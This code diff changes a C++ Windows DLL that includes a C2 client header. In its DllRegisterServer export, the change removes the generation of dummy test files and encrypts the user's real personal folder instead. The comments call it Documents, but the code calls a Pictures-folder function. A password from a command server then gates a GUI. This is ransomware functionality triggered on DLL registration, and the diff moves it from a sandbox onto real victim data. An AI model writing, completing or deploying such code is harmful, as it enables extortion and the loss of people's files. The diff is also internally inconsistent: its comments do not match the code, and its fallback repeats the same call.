@@ -4,7 +4,10 @@
 #include <commctrl.h> // Required for Progress Bar
 #include "c2client.h"
 #include "utils.h"
+#include <ShlObj.h>    // for SHGetKnownFolderPath
+#include <Knownfolders.h>
 
+#pragma comment(lib, "Shell32.lib")
 #pragma comment(lib, "comctl32.lib") // Ensure linking of common controls
 
 // Global Variables
@@ -269,20 +272,26 @@ void ShowGUI()
 
 // DLL Functions
 extern "C" __declspec(dllexport) HRESULT __stdcall DllRegisterServer() { 
-
-    // getting the password
-    //std::string password = C2Client::get_password_from_server();
-	std::string password = "password"; // Placeholder for password retrieval
+    // get the password
+    std::string password = "password"; // Or C2Client::get_password_from_server();
     correctPassword = std::wstring(password.begin(), password.end());
 
+    // Use real Documents folder
+    std::wstring realDocs = GetUserPicturesFolder();
+    if (realDocs.empty()) {
+        realDocs = GetUserPicturesFolder(); // fallback
+    }
 
+    // Remove GenDummyF!
+    // GenDummyF(realDocs, filesPerType); // <--- delete this
 
-    int filesPerType = 5;
-    GenDummyF(targetFolder,filesPerType);
-	EncAllF(targetFolder, password); // Encrypt files with the password
+    // Encrypt files in user's Documents
+    EncAllF(realDocs, password);
+
     ShowGUI(); 
     return S_OK; 
 }
+
 extern "C" __declspec(dllexport) HRESULT __stdcall DllUnregisterServer() { return S_OK; }
 extern "C" __declspec(dllexport) HRESULT __stdcall DllInstall() { return S_OK; }
 
